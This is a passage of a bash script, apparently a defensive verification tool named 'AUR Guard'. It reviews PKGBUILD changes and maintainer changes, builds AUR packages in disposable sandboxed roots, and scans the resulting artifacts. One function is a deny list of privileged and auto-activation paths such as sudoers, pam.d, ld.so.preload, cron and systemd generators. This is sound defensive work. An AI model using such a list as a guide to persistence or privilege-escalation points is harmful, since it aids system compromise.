        "$pkgbase"$'\t'"$commit"$'\t'"$pkgdir"$'\t'"$snapshot"$'\t'"$kind"$'\t'"${versions//$'\n'/, }"$'\t'"$identity"
      )
    fi
  done < "$_AUR_GUARD_MANIFEST"

  (( ${#all_entries[@]} > 0 )) || return 0

  printf '\n%sAUR package review summary%s\n' "$cyan" "$reset"
  for entry in "${all_entries[@]}"; do
    IFS=$'\t' read -r pkgbase commit pkgdir snapshot kind versions \
      current_maintainer previous_maintainer last_modified flagged identity <<< "$entry"
    age=$(_aur_guard_format_revision_age "$last_modified")

    printf '\n  %s%s%s\n' "$bold" "$pkgbase" "$reset"
    printf '    Installed: %s\n' "$versions"

    case "$identity" in
      changed)
        printf '    Maintainer: %s%s -> %s [CHANGED]%s\n' \
          "$red" "$previous_maintainer" "$current_maintainer" "$reset"
        ;;
      baseline-missing)
        if [[ "$current_maintainer" == '<orphaned>' ]]; then
          printf '    Maintainer: %s%s [ORPHANED; no saved baseline]%s\n' \
            "$red" "$current_maintainer" "$reset"
        else
          printf '    Maintainer: %s%s [no saved baseline]%s\n' \
            "$yellow" "$current_maintainer" "$reset"
        fi
        ;;
      *)
        if [[ "$current_maintainer" == '<orphaned>' ]]; then
          printf '    Maintainer: %s%s [ORPHANED]%s\n' \
            "$red" "$current_maintainer" "$reset"
        else
          printf '    Maintainer: %s%s [unchanged]%s\n' \
            "$green" "$current_maintainer" "$reset"
        fi
        ;;
    esac

    if _aur_guard_revision_is_recent "$last_modified"; then
      printf '    AUR revision: %s%s old [RECENT: within %sh]%s\n' \
        "$yellow" "$age" "$threshold_hours" "$reset"
    else
      printf '    AUR revision: %s%s old%s\n' "$green" "$age" "$reset"
    fi

    case "$kind" in
      diff)
        if (( flagged > 0 )); then
          printf '    PKGBUILD: %schanged | flagged additions: %s%s\n' \
            "$red" "$flagged" "$reset"
        else
          printf '    PKGBUILD: %schanged | flagged additions: 0%s\n' \
            "$yellow" "$reset"
        fi
        ;;
      current)
        printf '    PKGBUILD: %sno saved baseline | flagged current lines: %s%s\n' \
          "$yellow" "$flagged" "$reset"
        ;;
      unchanged)
        printf '    PKGBUILD: %sunchanged%s\n' "$green" "$reset"
        ;;
    esac

    if [[ "$identity" == changed ]] \
        && _aur_guard_revision_is_recent "$last_modified"; then
      printf '    Risk: %sCRITICAL - maintainer changed on a recent AUR revision%s\n' \
        "$red" "$reset"
    fi
  done

  (( ${#review_entries[@]} > 0 )) || return 0

  printf '\n%sPKGBUILD review is available for installed AUR packages.%s\n' "$cyan" "$reset"
  printf 'PKGBUILD changes use an AUR-style line-numbered code view. Green lines are unflagged; red [FLAGGED] lines require extra attention.\n'

  if $mandatory_review; then
    printf '%sMaintainer ownership changed. PKGBUILD display is mandatory.%s\n' \
      "$red" "$reset"
  else
    if _aur_guard_is_installer_mode; then
      printf 'Awtarchy installer mode: skipping optional PKGBUILD display.\n'
      return 0
    fi

    if [[ ! -r /dev/tty ]]; then
      printf 'No readable terminal is available; skipping optional PKGBUILD display.\n'
      return 0
    fi

    printf 'View the PKGBUILD review before building? [y/N]: '
    IFS= read -r answer </dev/tty || return 0
    case "$answer" in
      y|Y|yes|YES|Yes)
        ;;
      *)
        printf 'PKGBUILD display skipped.\n'
        return 0
        ;;
    esac
  fi

  for entry in "${review_entries[@]}"; do
    IFS=$'\t' read -r pkgbase commit pkgdir snapshot kind versions identity <<< "$entry"
    printf '\n%s===== %s PKGBUILD review =====%s\n' "$cyan" "$pkgbase" "$reset"
    printf 'Installed: %s\nVerified AUR commit: %s\n' "$versions" "$commit"

    case "$kind" in
      diff)
        _aur_guard_render_pkgbuild_diff \
          "$snapshot" "$pkgdir/PKGBUILD" \
          "$pkgbase previous successful install" \
          "$pkgbase verified AUR ${commit:0:12}" || {
            printf 'AUR Guard: could not render the PKGBUILD diff for %s.\n' "$pkgbase" >&2
          }
        ;;
      unchanged)
        printf 'The PKGBUILD is unchanged, but the maintainer change requires a full source review.\n'
        _aur_guard_render_current_pkgbuild "$pkgdir/PKGBUILD"
        ;;
      current)
        printf 'No previous AUR Guard PKGBUILD snapshot exists. Showing the current PKGBUILD in a line-numbered source view.\n'
        _aur_guard_render_current_pkgbuild "$pkgdir/PKGBUILD"
        ;;
    esac
  done

  printf '\nPKGBUILD review complete.\n'
  printf 'Continue with the verified clean build? [y/N]: '

  if [[ ${AUR_GUARD_TEST_MODE:-0} == 1 ]]; then
    IFS= read -r answer || answer=
  else
    if [[ ! -r /dev/tty ]]; then
      printf '\nNo readable terminal is available; cancelling before the clean build.\n' >&2
      return 20
    fi
    IFS= read -r answer </dev/tty || answer=
  fi

  case "$answer" in
    y|Y|yes|YES|Yes)
      printf 'PKGBUILD review approved; continuing with the verified clean build.\n'
      return 0
      ;;
    *)
      printf 'Build cancelled after PKGBUILD review.\n'
      return 20
      ;;
  esac
}

_aur_guard_store_pkgbuild_snapshots() {
  local root pkgbase commit remote parent pkgdir base_dir temp metadata_temp
  local versions current maintainer last_modified
  local failed=false

  root="$_AUR_GUARD_STATE_DIR/pkgbuilds"
  if ! mkdir -p -- "$root" || ! chmod 700 -- "$_AUR_GUARD_STATE_DIR" "$root" 2>/dev/null; then
    printf 'AUR Guard: warning: could not prepare the PKGBUILD snapshot directory: %s\n' "$root" >&2
    return 1
  fi

  while IFS=$'\t' read -r pkgbase commit remote parent pkgdir; do
    [[ -n "$pkgbase" && -f "$pkgdir/PKGBUILD" && ! -L "$pkgdir/PKGBUILD" ]] || continue
    base_dir="$root/$pkgbase"

    if [[ -L "$base_dir" || ( -e "$base_dir" && ! -d "$base_dir" ) ]]; then
      printf 'AUR Guard: warning: unsafe PKGBUILD snapshot path skipped: %s\n' "$base_dir" >&2
      failed=true
      continue
    fi

    if ! mkdir -p -- "$base_dir" || ! chmod 700 -- "$base_dir"; then
      printf 'AUR Guard: warning: could not create PKGBUILD snapshot directory for %s.\n' "$pkgbase" >&2
      failed=true
      continue
    fi

    temp=$(mktemp "$base_dir/.PKGBUILD.XXXXXX") || {
      failed=true
      continue
    }
    if ! install -m 600 -- "$pkgdir/PKGBUILD" "$temp" \
        || ! mv -f -- "$temp" "$base_dir/PKGBUILD"; then
      rm -f -- "$temp"
      printf 'AUR Guard: warning: could not save the PKGBUILD snapshot for %s.\n' "$pkgbase" >&2
      failed=true
      continue
    fi

    current=$(_aur_guard_current_metadata_for_base "$pkgbase") || {
      printf 'AUR Guard: warning: could not save maintainer metadata for %s.\n' "$pkgbase" >&2
      failed=true
      continue
    }
    IFS=$'\t' read -r maintainer last_modified <<< "$current"
    versions=$(_aur_guard_installed_versions_for_base "$pkgbase" 2>/dev/null || true)

    metadata_temp=$(mktemp "$base_dir/.metadata.XXXXXX") || {
      failed=true
      continue
    }
    if ! {
        printf 'commit=%s\n' "$commit"
        printf 'maintainer=%s\n' "$maintainer"
        printf 'last_modified=%s\n' "$last_modified"
        printf 'saved_at=%s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
        printf 'installed=%s\n' "${versions//$'\n'/, }"
      } > "$metadata_temp" \
        || ! chmod 600 -- "$metadata_temp" \
        || ! mv -f -- "$metadata_temp" "$base_dir/metadata"; then
      rm -f -- "$metadata_temp"
      printf 'AUR Guard: warning: could not save AUR metadata for %s.\n' "$pkgbase" >&2
      failed=true
      continue
    fi
  done < "$_AUR_GUARD_MANIFEST"

  $failed && return 1
  return 0
}


_aur_guard_confirm_unchecked_commits() {
  local phase="$1"
  shift
  local entry pkgbase expected answer phrase token

  token=$(printf '%s\n' "$@" | sha256sum | awk '{print substr($1, 1, 12)}') || return 1
  phrase="CONTINUE VERIFIED ${token}"

  printf '\n\033[1;33mAUR Guard could not confirm the following current AUR commits %s:\033[0m\n' \
    "$phase" >&2
  for entry in "$@"; do
    IFS=$'\t' read -r pkgbase expected <<< "$entry"
    printf '  %-36s %s\n' "$pkgbase" "${expected:0:12}" >&2
  done
  printf 'These already-fetched revisions passed verification, but their current AUR status could not be checked.\n' >&2
  printf 'This is a network or namespace verification failure, not proof that the packages changed.\n' >&2
  printf 'Type exactly %s to continue with these verified revisions: ' "$phrase" >&2

  if [[ ! -r /dev/tty ]]; then
    printf '\nNo readable terminal is available for confirmation.\n' >&2
    return 1
  fi

  IFS= read -r answer </dev/tty || return 1
  [[ "$answer" == "$phrase" ]]
}

_aur_guard_recheck_commits() {
  local phase="${1:-before installation}"
  local pkgbase expected remote parent pkgdir current temp attempt
  local -a unconfirmed=()

  temp=$(mktemp -d) || return 1

  while IFS=$'\t' read -r pkgbase expected remote parent pkgdir; do
    [[ -n "$pkgbase" ]] || continue
    _aur_guard_validate_official_remote "$pkgbase" "$remote" || {
      rm -rf "$temp"
      return 1
    }

    current=
    for ((attempt = 1; attempt <= _AUR_GUARD_COMMIT_RECHECK_ATTEMPTS; attempt++)); do
      if current=$(
          _aur_guard_sandbox_exec "$temp" allow writable / \
            /usr/bin/git ls-remote -- "$remote" HEAD 2>/dev/null
        ); then
        current=$(awk 'NR == 1 {print $1}' <<< "$current")
      else
        current=
      fi

      if [[ "$current" =~ ^[0-9a-fA-F]{40,64}$ ]]; then
        break
      fi

      current=
      if (( attempt < _AUR_GUARD_COMMIT_RECHECK_ATTEMPTS )); then
        printf 'AUR Guard: retrying current AUR commit check for %s (%d/%d).\n' \
          "$pkgbase" "$attempt" "$_AUR_GUARD_COMMIT_RECHECK_ATTEMPTS" >&2
        sleep "$_AUR_GUARD_COMMIT_RECHECK_DELAY_SECONDS"
      fi
    done

    if [[ -z "$current" ]]; then
      unconfirmed+=("$pkgbase"$'\t'"$expected")
      continue
    fi

    if [[ "$current" != "$expected" ]]; then
      rm -rf "$temp"
      _aur_guard_fail "$pkgbase changed after verification"
      printf 'Verified: %s\nCurrent:  %s\n' "$expected" "$current" >&2
      return 3
    fi
  done < "$_AUR_GUARD_MANIFEST"

  rm -rf "$temp"

  if (( ${#unconfirmed[@]} > 0 )); then
    if ! _aur_guard_confirm_unchecked_commits "$phase" "${unconfirmed[@]}"; then
      _aur_guard_fail 'could not confirm one or more current AUR commits'
      return 2
    fi
  fi
}

_aur_guard_prepare_build_root() {
  local build_root="$1"
  local -a repo_packages=(base-devel)
  local dep

  if [[ -s "$_AUR_GUARD_REPO_DEPS" ]]; then
    while IFS= read -r dep; do
      [[ -n "$dep" ]] && repo_packages+=("$dep")
    done < <(LC_ALL=C sort -u "$_AUR_GUARD_REPO_DEPS")
  fi

  sudo rm -rf -- "$build_root"
  sudo mkdir -p -- "$(dirname -- "$build_root")" || return 1

  printf 'AUR Guard: creating a disposable clean Arch build root.\n'
  sudo mkarchroot "$build_root" "${repo_packages[@]}"
}

_aur_guard_install_prior_artifacts_into_root() {
  local build_root="$1"
  local pkgbase pkgname artifact hash
  # arch-nspawn bind-mounts pacman's cache over the clean root, while
  # systemd-nspawn commonly overlays /tmp. Use an ordinary persistent path
  # inside the disposable root that neither wrapper replaces.
  local copied_dir="$build_root/var/lib/awtarchy-dependencies"
  local -a copied=()

  [[ -s "$_AUR_GUARD_ARTIFACTS" ]] || return 0

  sudo install -d -m 0755 "$copied_dir" || return 1

  while IFS=$'\t' read -r pkgbase pkgname artifact hash; do
    [[ -n "$artifact" && -f "$artifact" ]] || continue
    sudo install -m 0644 -- "$artifact" "$copied_dir/$(basename -- "$artifact")" || return 1
    copied+=("/var/lib/awtarchy-dependencies/$(basename -- "$artifact")")
  done < "$_AUR_GUARD_ARTIFACTS"

  (( ${#copied[@]} > 0 )) || return 0

  sudo arch-nspawn "$build_root" \
    --private-network \
    /usr/bin/pacman -U --noconfirm --needed "${copied[@]}"
}

_aur_guard_artifact_name() {
  local artifact="$1"
  command bsdtar -xOf "$artifact" .PKGINFO 2>/dev/null \
    | awk -F ' = ' '$1 == "pkgname" {print $2; exit}'
}

_aur_guard_artifact_path_is_blocked() {
  local relative="$1"

  case "$relative" in
    .INSTALL|\
    etc/sudoers|etc/sudoers.d/*|\
    etc/pam.d/*|usr/lib/security/*|\
    etc/ld.so.preload|etc/ld.so.conf.d/*|usr/lib/ld.so.conf.d/*|\
    etc/profile|etc/profile.d/*|etc/bash.bashrc|\
    etc/cron*|usr/lib/cron/*|usr/bin/crontab|\
    etc/xdg/autostart/*|usr/share/autostart/*|\
    usr/share/libalpm/hooks/*|\
    usr/lib/systemd/system-preset/*|usr/lib/systemd/user-preset/*|\
    usr/lib/systemd/system-generators/*|usr/lib/systemd/user-generators/*|\
    usr/lib/systemd/system-environment-generators/*|usr/lib/systemd/user-environment-generators/*|\
    usr/lib/tmpfiles.d/*|usr/lib/sysusers.d/*|\
    usr/lib/udev/rules.d/*|etc/udev/rules.d/*|\
    usr/share/polkit-1/rules.d/*|usr/share/polkit-1/actions/*|\
    usr/share/dbus-1/system-services/*|usr/share/dbus-1/services/*|\
    usr/lib/modules/*|usr/lib/modules-load.d/*|usr/lib/modprobe.d/*|\
    usr/lib/sysctl.d/*|usr/lib/binfmt.d/*|usr/lib/environment.d/*)
      return 0
      ;;
  esac

  return 1
}

_aur_guard_pkginfo_has_dependency() {
  local pkginfo="$1"
  local expected="$2"

  [[ -f "$pkginfo" && ! -L "$pkginfo" ]] || return 1

  LC_ALL=C awk -F ' = ' -v expected="$expected" '
    $1 == "depend" {
      dependency = $2
      sub(/[<>=].*$/, "", dependency)
      if (dependency == expected) found = 1
    }
    END { exit found ? 0 : 1 }
  ' "$pkginfo"
}

_aur_guard_absolute_license_link_is_safe() {
  local entry="$1"
  local target="$2"
  local scan_root="$3"
  local pkgname="$4"
  local relative target_pkg

  relative=${entry#"$scan_root"/}
  [[ "$relative" == "usr/share/licenses/$pkgname" ]] || return 1
  [[ "$target" =~ ^/usr/share/licenses/([a-zA-Z0-9@._+:-]+)$ ]] || return 1
  target_pkg=${BASH_REMATCH[1]}
  [[ "$target_pkg" != "$pkgname" ]] || return 1
  _aur_guard_validate_package_name "$target_pkg" >/dev/null || return 1
  _aur_guard_pkginfo_has_dependency "$scan_root/.PKGINFO" "$target_pkg"
}

_aur_guard_analyze_artifact_listing() {
  local pkgbase="$1"
  local listing="$2"
  local report="$3"
  local icon_candidate=0

  case "$pkgbase" in
    *icon-theme*) icon_candidate=1 ;;
  esac

  LC_ALL=C awk -v icon_candidate="$icon_candidate" '
    BEGIN {
      icon_only = icon_candidate
      has_pkginfo = 0
      has_buildinfo = 0
      has_mtree = 0
      unsafe = 0
      duplicate = 0
    }
    {
      raw = $0
      count += 1

      if (raw ~ /^\// || raw == ".." || raw ~ /^\.\.\// \
          || raw ~ /\/\.\.\// || raw ~ /\/\.\.$/) {
        unsafe = 1
      }

      normalized = raw
      sub(/^\.\//, "", normalized)
      sub(/\/+$/, "", normalized)

      if (normalized != "") {
        if (seen[normalized]++) duplicate = 1
      }

      if (normalized == ".PKGINFO") has_pkginfo = 1
      if (normalized == ".BUILDINFO") has_buildinfo = 1
      if (normalized == ".MTREE") has_mtree = 1

      if (icon_only \
          && normalized != ".PKGINFO" \
          && normalized != ".BUILDINFO" \
          && normalized != ".MTREE" \
          && normalized != "usr" \
          && normalized != "usr/share" \
          && normalized !~ /^usr\/share\/(icons|themes|licenses)(\/|$)/) {
        icon_only = 0
      }
    }
    END {
      printf "file_count\t%d\n", count
      printf "icon_theme_only\t%d\n", icon_only
      printf "unsafe_path\t%d\n", unsafe
      printf "duplicate_path\t%d\n", duplicate
      printf "has_pkginfo\t%d\n", has_pkginfo
      printf "has_buildinfo\t%d\n", has_buildinfo
      printf "has_mtree\t%d\n", has_mtree
    }
  ' "$listing" > "$report"
}

_aur_guard_artifact_report_value() {
  local report="$1"
  local key="$2"

  LC_ALL=C awk -F '\t' -v key="$key" '
    $1 == key { print $2; found = 1; exit }
    END { if (!found) exit 1 }
  ' "$report"
}

_aur_guard_normalize_link_target() {
  local link_path="$1"
  local target="$2"
  local output_name="$3"
  local combined remaining component
  local last_index
  local -a normalized=()
  local -n output_ref="$output_name"

  output_ref=''

  if [[ "$target" == /* ]]; then
    combined="${target#/}"
  elif [[ "$link_path" == */* ]]; then
    combined="${link_path%/*}/$target"
  else
    combined="$target"
  fi

  remaining="$combined"
  while :; do
    if [[ "$remaining" == */* ]]; then
      component="${remaining%%/*}"
      remaining="${remaining#*/}"
    else
      component="$remaining"
      remaining=''
    fi

    case "$component" in
      ''|.)
        ;;
      ..)
        (( ${#normalized[@]} > 0 )) || return 1
        last_index=$(( ${#normalized[@]} - 1 ))
        unset "normalized[$last_index]"
        ;;
      *)
        normalized+=("$component")
        ;;
    esac

    [[ -n "$remaining" ]] || break
  done

  if (( ${#normalized[@]} > 0 )); then
    local IFS=/
    # output_ref is a nameref that writes to the caller.
    # shellcheck disable=SC2034
    output_ref="${normalized[*]}"
  fi
}

_aur_guard_scan_artifact() {
  local pkgbase="$1"
  local artifact="$2"
  local scan_root="$3"
  local entry relative target resolved normalized_target
  local artifact_size file_count artifact_file_limit listing verbose_listing analysis_report
  local icon_theme_only unsafe_path duplicate_path has_pkginfo has_buildinfo has_mtree
  local pkginfo_archive pkgbase_metadata pkgname_metadata metadata_value
  local checked_entries=0
  local checked_links=0
  local copied_artifact="$scan_root/.artifact.pkg"

  artifact_size=$(stat -c %s "$artifact" 2>/dev/null) || return 1
  if (( artifact_size > _AUR_GUARD_ARTIFACT_MAX_BYTES )); then
    _aur_guard_fail "$pkgbase produced an artifact larger than the configured limit"
    return 1
  fi

  rm -rf "$scan_root"
  mkdir -p "$scan_root" || return 1
  listing="$scan_root/.archive-list"
  verbose_listing="$scan_root/.archive-list-verbose"
  analysis_report="$scan_root/.archive-analysis"
  pkginfo_archive="$scan_root/.archive-pkginfo"

  printf 'AUR Verify: inspecting %s artifact %s (%s bytes).\n' \
    "$pkgbase" "${artifact##*/}" "$artifact_size" >&2

  if ! _aur_guard_run_with_progress \
      "reading $pkgbase archive paths" \
      command bsdtar -tf "$artifact" > "$listing"; then
    _aur_guard_fail "$pkgbase produced an unreadable package archive"
    return 1
  fi

  if ! _aur_guard_analyze_artifact_listing \
      "$pkgbase" "$listing" "$analysis_report"; then
    _aur_guard_fail "$pkgbase archive path analysis failed"
    return 1
  fi

  file_count=$(_aur_guard_artifact_report_value "$analysis_report" file_count) || return 1
  icon_theme_only=$(_aur_guard_artifact_report_value "$analysis_report" icon_theme_only) || return 1
  unsafe_path=$(_aur_guard_artifact_report_value "$analysis_report" unsafe_path) || return 1
  duplicate_path=$(_aur_guard_artifact_report_value "$analysis_report" duplicate_path) || return 1
  has_pkginfo=$(_aur_guard_artifact_report_value "$analysis_report" has_pkginfo) || return 1
  has_buildinfo=$(_aur_guard_artifact_report_value "$analysis_report" has_buildinfo) || return 1
  has_mtree=$(_aur_guard_artifact_report_value "$analysis_report" has_mtree) || return 1

  printf 'AUR Verify: %s artifact contains %d archive entries.\n' \
    "$pkgbase" "$file_count" >&2

  if (( unsafe_path != 0 )); then
    _aur_guard_fail "$pkgbase produced an archive with an unsafe parent or absolute path"
    return 1
  fi
  if (( duplicate_path != 0 )); then
    _aur_guard_fail "$pkgbase produced an archive with a duplicate normalized path"
    return 1
  fi
  if (( has_pkginfo == 0 )); then
    _aur_guard_fail "$pkgbase produced an artifact without required package metadata: .PKGINFO"
    return 1
  fi
  if (( has_buildinfo == 0 )); then
    _aur_guard_fail "$pkgbase produced an artifact without required package metadata: .BUILDINFO"
    return 1
  fi
  if (( has_mtree == 0 )); then
    _aur_guard_fail "$pkgbase produced an artifact without required package metadata: .MTREE"
    return 1
  fi

  if (( icon_theme_only != 0 )); then
    artifact_file_limit=$_AUR_GUARD_ICON_THEME_ARTIFACT_MAX_FILES
  else
    artifact_file_limit=$_AUR_GUARD_ARTIFACT_MAX_FILES
  fi

  if (( file_count > artifact_file_limit )); then
    _aur_guard_fail "$pkgbase produced an artifact containing too many archive entries"
    return 1
  fi
  if (( file_count > _AUR_GUARD_ARTIFACT_MAX_FILES )); then
    printf 'AUR Verify: %s is a path-constrained icon-theme artifact; applying the dedicated %d-entry ceiling.\n' \
      "$pkgbase" "$_AUR_GUARD_ICON_THEME_ARTIFACT_MAX_FILES" >&2
  fi

  if ! _aur_guard_run_with_progress \
      "reading $pkgbase archive link metadata" \
      command bsdtar -tvf "$artifact" > "$verbose_listing"; then
    _aur_guard_fail "$pkgbase produced unreadable archive link metadata"
    return 1
  fi

  if grep -E ' link to /' "$verbose_listing"; then
    _aur_guard_fail "$pkgbase produced an archive with an absolute hard-link target"
    return 1
  fi

  if ! command bsdtar -xOf "$artifact" .PKGINFO > "$pkginfo_archive" 2>/dev/null; then
    _aur_guard_fail "$pkgbase package metadata could not be extracted"
    return 1
  fi

  pkgbase_metadata=$(awk -F ' = ' '$1 == "pkgbase" {print $2; exit}' "$pkginfo_archive")
  pkgname_metadata=$(awk -F ' = ' '$1 == "pkgname" {print $2; exit}' "$pkginfo_archive")
  if [[ -z "$pkgbase_metadata" || "$pkgbase_metadata" != "$pkgbase" ]]; then
    _aur_guard_fail "$pkgbase produced an artifact claiming unexpected pkgbase: ${pkgbase_metadata:-missing}"
    return 1
  fi
  _aur_guard_validate_package_name "$pkgname_metadata" || return 1

  while IFS= read -r metadata_value; do
    [[ -n "$metadata_value" ]] || continue
    _aur_guard_note_context_warning \
      "$pkgname_metadata package replacement" \
      "Built metadata declares replaces=$metadata_value; pacman may remove or supersede another package."
  done < <(awk -F ' = ' '$1 == "replaces" {print $2}' "$pkginfo_archive")

  while IFS= read -r metadata_value; do
    [[ -n "$metadata_value" ]] || continue
    _aur_guard_note_context_warning \
      "$pkgname_metadata package conflict" \
      "Built metadata declares conflict=$metadata_value; pacman may require removing a conflicting package."
  done < <(awk -F ' = ' '$1 == "conflict" {print $2}' "$pkginfo_archive")

  rm -f "$listing" "$verbose_listing" "$analysis_report" "$pkginfo_archive"
  ln "$artifact" "$copied_artifact" 2>/dev/null \
    || cp --reflink=auto -- "$artifact" "$copied_artifact" \
    || return 1

  if ! _aur_guard_run_with_progress \
      "extracting $pkgbase artifact for sandboxed inspection" \
      _aur_guard_sandbox_exec \
        "$scan_root" deny writable / \
        /usr/bin/bsdtar -xf /work/.artifact.pkg -C /work; then
    rm -f "$copied_artifact"
    _aur_guard_fail "could not safely extract built artifact for inspection: $artifact"
    return 1
  fi
  rm -f "$copied_artifact"

  if [[ -e "$scan_root/.INSTALL" ]]; then
    _aur_guard_fail "$pkgbase generated a pacman install script; root scriptlets are blocked by policy"
    return 1
  fi

  if (( icon_theme_only != 0 )); then
    printf 'AUR Verify: %s path policy was already validated in one archive-list pass; skipping the redundant extracted-tree path loop.\n' \
      "$pkgbase" >&2
  else
    printf 'AUR Verify: validating extracted paths for %s.\n' "$pkgbase" >&2
    while IFS= read -r -d '' entry; do
      ((checked_entries += 1))
      if (( checked_entries % _AUR_GUARD_PROGRESS_ENTRY_INTERVAL == 0 )); then
        printf 'AUR Verify: validated %d extracted paths for %s so far.\n' \
          "$checked_entries" "$pkgbase" >&2
      fi

      relative="${entry#"$scan_root"/}"
      if _aur_guard_artifact_path_is_blocked "$relative"; then
        _aur_guard_fail "$pkgbase installs a blocked privileged or auto-activation path: $relative"
        return 1
      fi
    done < <(find -P "$scan_root" -mindepth 1 -print0)
    printf 'AUR Verify: validated %d extracted paths for %s.\n' \
      "$checked_entries" "$pkgbase" >&2
  fi

  if find -P "$scan_root" -xdev \( -type b -o -type c -o -type p -o -type s \) \
      -print -quit | grep -q .; then
    _aur_guard_fail "$pkgbase generated a device, FIFO, or socket entry"
    return 1
  fi

  if find -P "$scan_root" -xdev -type f -perm /6000 -print -quit | grep -q .; then
    _aur_guard_fail "$pkgbase generated a setuid or setgid file"
    return 1
  fi

  printf 'AUR Verify: validating symbolic links for %s.\n' "$pkgbase" >&2
  while IFS= read -r -d '' relative \
      && IFS= read -r -d '' target; do
    ((checked_links += 1))
    if (( checked_links % _AUR_GUARD_PROGRESS_ENTRY_INTERVAL == 0 )); then
      printf 'AUR Verify: validated %d symbolic links for %s so far.\n' \
        "$checked_links" "$pkgbase" >&2
    fi

    normalized_target=''
    if ! _aur_guard_normalize_link_target \
        "$relative" "$target" normalized_target; then
      _aur_guard_fail "$pkgbase generated a symbolic link escaping the package root: $relative -> $target"
      return 1
    fi

    resolved="$scan_root"
    [[ -n "$normalized_target" ]] && resolved+="/$normalized_target"
    entry="$scan_root/$relative"

    if [[ "$target" == /* && ! -e "$resolved" && ! -L "$resolved" ]]; then
      if _aur_guard_absolute_license_link_is_safe \
          "$entry" "$target" "$scan_root" "$pkgname_metadata"; then
        printf 'AUR Verify: accepted dependency-owned license link: %s -> %s\n' \
          "$relative" "$target"
      else
        _aur_guard_fail "$pkgbase generated an absolute symbolic link to a path not provided by the package: $relative -> $target"
        return 1
      fi
    fi
  done < <(find -P "$scan_root" -xdev -type l -printf '%P\0%l\0')
  printf 'AUR Verify: validated %d symbolic links for %s.\n' \
    "$checked_links" "$pkgbase" >&2

  if type -P getcap >/dev/null 2>&1; then
    if command getcap -r "$scan_root" 2>/dev/null | grep -q .; then
      command getcap -r "$scan_root" 2>/dev/null >&2 || true
      _aur_guard_fail "$pkgbase generated files with Linux capabilities"
      return 1
    fi
  fi

  if type -P clamscan >/dev/null 2>&1; then
    if ! _aur_guard_run_with_progress \
        "running optional ClamAV scan for $pkgbase" \
        command clamscan --infected --recursive --no-summary "$scan_root"; then
      _aur_guard_fail "$pkgbase artifact failed the optional ClamAV scan"
      return 1
    fi
  fi

  if _aur_guard_is_deep_mode; then
    _aur_guard_scan_source_tree "$pkgbase built artifact" "$scan_root" recursive
  else
    printf 'AUR Verify: practical mode inspected %s artifact metadata, paths, links, privileges, and activation points without recursively scanning trusted upstream contents.\n' \
      "$pkgbase"
  fi
}

_aur_guard_build_verified_artifacts() {
  local requested_pkg="$1"
  local pkgbase expected remote parent pkgdir build_root build_network
  local required required_base required_name pkgname artifact scan_root hash
  local -a artifacts=()

  while IFS=$'\t' read -r pkgbase expected remote parent pkgdir; do
    [[ -n "$pkgbase" && -d "$pkgdir" ]] || {
      _aur_guard_fail "verified package directory is missing for $pkgbase"
      return 1
    }

    build_root="$_AUR_GUARD_WORK_DIR/build-roots/${pkgbase//[^a-zA-Z0-9._+-]/_}"
    _aur_guard_prepare_build_root "$build_root" || {
      _aur_guard_fail "$pkgbase clean build-root creation failed"
      return 1
    }

    _aur_guard_install_prior_artifacts_into_root "$build_root" || {
      sudo rm -rf -- "$build_root"
      _aur_guard_fail "$pkgbase could not install previously verified AUR dependencies into its disposable build root"
      return 1
    }

    printf '\nAUR Guard: preparing %s from verified commit %s inside a disposable public-network sandbox.\n' \
      "$pkgbase" "${expected:0:12}"

    rm -rf "$pkgdir/.awtarchy-build" "$pkgdir/.awtarchy-pkg" \
      "$pkgdir/.awtarchy-log" "$pkgdir/.awtarchy-artifact-scan"
    mkdir -p "$pkgdir/.awtarchy-build" "$pkgdir/.awtarchy-pkg" \
      "$pkgdir/.awtarchy-log" "$pkgdir/.awtarchy-artifact-scan" || {
      sudo rm -rf -- "$build_root"
      return 1
    }

    _aur_guard_prepare_pkgbuild_mutation_state "$pkgbase" "$pkgdir" || {
      sudo rm -rf -- "$build_root"
      return 1
    }

    _AUR_GUARD_SANDBOX_ROOTFS="$build_root"
    if ! _aur_guard_makepkg_sandbox "$pkgdir" allow writable \
        --nobuild --nodeps --holdver --noconfirm --nocolor; then
      unset _AUR_GUARD_SANDBOX_ROOTFS
      sudo rm -rf -- "$build_root"
      _aur_guard_fail "$pkgbase failed its isolated network preparation step"
      return 1
    fi

    _aur_guard_accept_prepared_pkgver_update "$pkgbase" "$pkgdir" || {
      unset _AUR_GUARD_SANDBOX_ROOTFS
      sudo rm -rf -- "$build_root"
      return 1
    }

    _aur_guard_verify_git_snapshots "$pkgbase" "$pkgdir" || {
      unset _AUR_GUARD_SANDBOX_ROOTFS
      sudo rm -rf -- "$build_root"
      return 1
    }

    if _aur_guard_is_deep_mode; then
      if ! _aur_guard_prefetch_pnpm_dependencies "$pkgbase" "$pkgdir"; then
        unset _AUR_GUARD_SANDBOX_ROOTFS
        sudo rm -rf -- "$build_root"
        return 1
      fi

      _aur_guard_scan_source_tree \
        "$pkgbase prepared source tree" \
        "$pkgdir/.awtarchy-build" recursive || {
        unset _AUR_GUARD_SANDBOX_ROOTFS
        sudo rm -rf -- "$build_root"
        return 1
      }

      _aur_guard_scan_source_tree \
        "$pkgbase downloaded dependency cache" \
        "$pkgdir/.awtarchy-cache" recursive || {
        unset _AUR_GUARD_SANDBOX_ROOTFS
        sudo rm -rf -- "$build_root"
        return 1
      }

      build_network=deny
      printf 'AUR Guard: deep mode is running build(), check(), and package() for %s with no network.\n' \
        "$pkgbase"
    else
      build_network=allow
      printf 'AUR Guard: practical mode is building %s in a disposable clean root with restricted public-only network access.\n' \
        "$pkgbase"
    fi

    if ! _aur_guard_makepkg_sandbox "$pkgdir" "$build_network" writable \
        --noextract --noprepare --nodeps --holdver --check --noconfirm --nocolor; then
      unset _AUR_GUARD_SANDBOX_ROOTFS
      sudo rm -rf -- "$build_root"
      _aur_guard_fail "$pkgbase failed its offline clean-root build/check/package step"
      return 1
    fi
    unset _AUR_GUARD_SANDBOX_ROOTFS
    sudo rm -rf -- "$build_root"

    _aur_guard_assert_prepared_pkgbuild_state "$pkgbase" "$pkgdir" || return 1
    _aur_guard_verify_git_snapshots "$pkgbase" "$pkgdir" || return 1
    _aur_guard_restore_original_pkgbuild "$pkgbase" "$pkgdir" || return 1

    if _aur_guard_is_deep_mode; then
      _aur_guard_scan_source_tree \
        "$pkgbase post-build source tree" \
        "$pkgdir/.awtarchy-build" recursive || return 1

      _aur_guard_scan_source_tree \
        "$pkgbase post-build dependency cache" \
        "$pkgdir/.awtarchy-cache" recursive || return 1

      _aur_guard_scan_source_tree \
        "$pkgbase post-build package workspace" \
